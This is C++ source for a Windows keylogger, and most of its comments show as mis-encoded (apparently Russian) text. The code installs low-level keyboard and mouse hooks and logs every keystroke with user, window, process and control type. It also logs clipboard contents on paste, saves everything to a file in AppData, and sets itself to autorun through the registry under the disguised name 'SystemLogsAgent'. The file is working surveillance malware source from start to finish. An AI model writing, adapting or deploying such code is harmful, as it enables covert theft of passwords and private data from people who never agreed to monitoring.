#define _WIN32_WINNT 0x0500 // ��������� ����������� ������ Windows API
#define UNICODE
#define _UNICODE // ��������� Unicode ��� ������� �����

// ����������� ��������� ��������� � ����������
#include <windows.h>
#include <psapi.h>          // ��� ������ � ����������
#include <shlobj.h>         // ��� ��������� ����� � ��������� ������
#include <sddl.h>           // ��� ������ � SID � ��������
#include <iostream>
#include <fstream>
#include <string>
#include <ctime>
#include <UIAutomation.h>   // ��� ����������� UI-���������
#include <vector>
#include <unordered_set>
#include <fstream>
#include <shlwapi.h>        // ��� ������ � ������
#include "json.hpp"         // ���������� ��� ������ � JSON

// �������� � ������������ ������������
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "uiautomationcore.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "shfolder.lib")
#pragma comment(lib, "shlwapi.lib")

using namespace std;
using json = nlohmann::json; // ��������� ������� � JSON-�����������

// ���������� ����������
HHOOK g_keyboardHook = NULL;
HHOOK g_mouseHook = NULL;
wstring logFilePath; // ���� � ����� �����
unordered_set<wstring> whitelist; // ����� ������
unordered_set<wstring> blacklist; // ������ ������

// ����� ������
vector<wstring> clipboardBuffer;
const int MAX_CLIPBOARD_BUFFER = 100;

// ���������� ����������� � ������ ������������
void SetAutorun() {
    wchar_t path[MAX_PATH];
    GetModuleFileNameW(NULL, path, MAX_PATH); // �������� ���� � ������������ �����

    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        // ������� ���� ��� �����������
        RegSetValueExW(hKey, L"SystemLogsAgent", 0, REG_SZ, (BYTE*)path, (wcslen(path) + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    }
}

// �������� ������������ JSON � ����� � ������ �������
void LoadConfig() {
    ifstream configFile("config.json");
    if (configFile.is_open()) {
        json config;
        configFile >> config;
        configFile.close();

        // ������ whitelist
        for (const auto& proc : config["whitelist"]) {
            string procStr = proc.get<string>();
            wstring procWStr(procStr.begin(), procStr.end());
            whitelist.insert(procWStr);
        }

        // ������ blacklist
        for (const auto& proc : config["blacklist"]) {
            string procStr = proc.get<string>();
            wstring procWStr(procStr.begin(), procStr.end());
            blacklist.insert(procWStr);
        }
    }
}

// �������� ���� � ���-�����
wstring GetLogFilePath() {
    wchar_t path[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, path); // ���� � AppData
    wstring dir = path;
    dir += L"\\SystemLogs";
    CreateDirectoryW(dir.c_str(), NULL); // �������� ����������
    dir += L"\\keylog.txt";
    return dir;
}

// �������� ��� �������� ��������� ����
wstring GetActiveProcessName() {
    HWND hwnd = GetForegroundWindow();
    DWORD pid;
    GetWindowThreadProcessId(hwnd, &pid);

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (hProcess != NULL) {
        wchar_t exeName[MAX_PATH];
        if (GetModuleBaseNameW(hProcess, NULL, exeName, MAX_PATH)) {
            CloseHandle(hProcess);
            return exeName;
        }
        CloseHandle(hProcess);
    }
    return L"Unknown Process";
}

// �������� ��������� ��������� ����
wstring GetActiveWindowTitle() {
    HWND hwnd = GetForegroundWindow();
    if (!hwnd) return L"Unknown Window";

    wchar_t title[256];
    GetWindowTextW(hwnd, title, sizeof(title) / sizeof(wchar_t));
    return title;
}

// �������� ��� ������������ ����� ����� ������������
wstring GetCurrentUserNameFromToken() {
    HANDLE hToken;
    DWORD dwSize = 0;
    PTOKEN_USER pTokenUser = NULL;
    wchar_t userName[256] = L"Unknown User";

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);
        pTokenUser = (PTOKEN_USER)malloc(dwSize);

        if (pTokenUser != NULL && GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize)) {
            wchar_t name[256], domain[256];
            DWORD nameLen = 256, domainLen = 256;
            SID_NAME_USE sidType;

            if (LookupAccountSidW(NULL, pTokenUser->User.Sid, name, &nameLen, domain, &domainLen, &sidType)) {
                wsprintf(userName, L"%s\\%s", domain, name);
            }
        }
        if (pTokenUser) free(pTokenUser);
        CloseHandle(hToken);
    }

    return userName;
}

// �������� ��� ��������� UI-��������
wstring GetFocusedControlType() {
    IUIAutomation* pAutomation = NULL;
    IUIAutomationElement* pFocusElement = NULL;
    wstring result = L"Unknown Control";

    if (SUCCEEDED(CoInitialize(NULL))) {
        if (SUCCEEDED(CoCreateInstance(__uuidof(CUIAutomation), NULL, CLSCTX_INPROC_SERVER, IID_PPV_ARGS(&pAutomation)))) {
            if (SUCCEEDED(pAutomation->GetFocusedElement(&pFocusElement))) {
                CONTROLTYPEID controlType = 0;
                if (SUCCEEDED(pFocusElement->get_CurrentControlType(&controlType))) {
                    switch (controlType) {
                    case UIA_EditControlTypeId: result = L"Text Input"; break;
                    case UIA_ButtonControlTypeId: result = L"Button"; break;
                    default: result = L"Other Control"; break;
                    }
                }
            }
        }
        if (pFocusElement) pFocusElement->Release();
        if (pAutomation) pAutomation->Release();
        CoUninitialize();
    }
    return result;
}

// ������ ������ �� ������ ������
wstring ReadClipboardText() {
    if (!IsClipboardFormatAvailable(CF_UNICODETEXT)) return L"";
    if (!OpenClipboard(NULL)) return L"";

    HANDLE hData = GetClipboardData(CF_UNICODETEXT);
    if (hData == NULL) {
        CloseClipboard();
        return L"";
    }

    wchar_t* pszText = (wchar_t*)GlobalLock(hData);
    if (pszText == NULL) {
        CloseClipboard();
        return L"";
    }

    wstring text = pszText;

    GlobalUnlock(hData);
    CloseClipboard();

    return text;
}

// ������ ������� � ���
void LogEvent(const wstring& text) {
    wofstream logFile(logFilePath, ios::app | ios::binary);
    if (logFile.is_open()) {
        logFile << text << L"\r\n\r\n\n";
        logFile.close();
    }
    wcout << text << endl << endl;
}

// �������� ��� �������
wstring GetKeyName(DWORD vkCode, DWORD scanCode) {
    wchar_t key[32] = { 0 };
    switch (vkCode) {
    case VK_LEFT: return L"[Left Arrow]";
    case VK_RIGHT: return L"[Right Arrow]";
    case VK_UP: return L"[Up Arrow]";
    case VK_DOWN: return L"[Down Arrow]";
    case VK_RETURN: return L"[Enter]";
    case VK_BACK: return L"[Backspace]";
    case VK_TAB: return L"[Tab]";
    case VK_SPACE: return L"[Space]";
    case VK_LWIN: return L"[Left Windows]";
    case VK_RWIN: return L"[Right Windows]";
    case VK_CONTROL: return L"[Control]";
    case VK_SHIFT: return L"[Shift]";
    case VK_MENU: return L"[Alt]";
    default:
        GetKeyNameTextW(scanCode << 16, key, 32);
        return key;
    }
}

// ���������� ����������, ������������� ������� ������
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        // ��������� �������� ���������� � �������
        KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;

        // �������� ��� ��������� ��������
        wstring processName = GetActiveProcessName();

        // ���� ������� � ������ ������ � ����������
        if (blacklist.find(processName) != blacklist.end()) return CallNextHookEx(NULL, nCode, wParam, lParam);
        // ���� ���� ����� ������, � ������� � ��� ����������� � ����������
        if (!whitelist.empty() && whitelist.find(processName) == whitelist.end()) return CallNextHookEx(NULL, nCode, wParam, lParam);

        // �������� ���������� � �������, ����, ���� �������� UI, ������������
        wstring key = GetKeyName(kbStruct->vkCode, kbStruct->scanCode);
        wstring windowTitle = GetActiveWindowTitle();
        wstring controlType = GetFocusedControlType();
        wstring userName = GetCurrentUserNameFromToken();

        // ����������� �����
        time_t now = time(0);
        tm tStruct;
        localtime_s(&tStruct, &now);
        wchar_t timeStr[64];
        wcsftime(timeStr, sizeof(timeStr) / sizeof(wchar_t), L"%Y-%m-%d %H:%M:%S", &tStruct);

        // ��������� ������ ��� �����������
        wstring logEntry = L"[" + wstring(timeStr) + L"]\nUser: " + userName +
            L"\nWindow: " + windowTitle +
            L"\nProcess: " + processName +
            L"\nControl Type: " + controlType +
            L"\nKey Pressed: " + key;

        // ���������� ������� � ���
        LogEvent(logEntry);

        // ��������, ���� ���� ������� Ctrl+V, �� ������ ����� ������
        if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) && (kbStruct->vkCode == 'V')) {
            Sleep(1); // ��������� �������� ��� ���������
            wstring clipboardText = ReadClipboardText();
            if (!clipboardText.empty()) {
                wstring clipboardLog = L"[" + wstring(timeStr) + L"] Clipboard: " + clipboardText;
                LogEvent(clipboardLog);
            }
        }
    }
    // �������� ���������� ���������� ���� � �������
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// ���������� ����: �������� ����� � ������ ���� ����
LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        wstring processName = GetActiveProcessName();

        // ���������� ���������, ���� ������� � ������ ������ ��� �� � �����
        if (blacklist.find(processName) != blacklist.end()) return CallNextHookEx(NULL, nCode, wParam, lParam);
        if (!whitelist.empty() && whitelist.find(processName) == whitelist.end()) return CallNextHookEx(NULL, nCode, wParam, lParam);

        // �������� �������� ���� � ��� ������������
        wstring windowTitle = GetActiveWindowTitle();
        wstring userName = GetCurrentUserNameFromToken();

        // ������� �����
        time_t now = time(0);
        tm tStruct;
        localtime_s(&tStruct, &now);
        wchar_t timeStr[64];
        wcsftime(timeStr, sizeof(timeStr) / sizeof(wchar_t), L"%Y-%m-%d %H:%M:%S", &tStruct);

        // � ����������� �� ���� ������� ����, �������� ����
        if (wParam == WM_LBUTTONDOWN) {
            LogEvent(L"[" + wstring(timeStr) + L"]\nUser: " + userName + L"\nMouse Click: Left\nWindow: " + windowTitle + L"\nProcess: " + processName);
        }
        else if (wParam == WM_RBUTTONDOWN) {
            LogEvent(L"[" + wstring(timeStr) + L"]\nUser: " + userName + L"\nMouse Click: Right\nWindow: " + windowTitle + L"\nProcess: " + processName);
        }
    }
    // �������� ���������� ����
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// ������� ����� �����
int wmain() {
    // ������������� ������
    setlocale(LC_ALL, "");

    // �������� ���� � ����� �����
    logFilePath = GetLogFilePath();

    // ������������� ���������� � �������
    SetAutorun();

    // ��������� ������������ (whitelist � blacklist)
    LoadConfig();

    // ������������� ���� ���������� � ����
    g_keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    g_mouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, NULL, 0);

    // ��������, ���� ���� �� �����������
    if (!g_keyboardHook || !g_mouseHook) {
        wcout << L"Error setting hooks." << endl;
        return 1;
    }

    wcout << L"Keylogger started. Press Ctrl+C to stop." << endl;

    // �������� ���� ��������� ���������
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // �������� ����� ��� ����������
    UnhookWindowsHookEx(g_keyboardHook);
    UnhookWindowsHookEx(g_mouseHook);
    return 0;
}


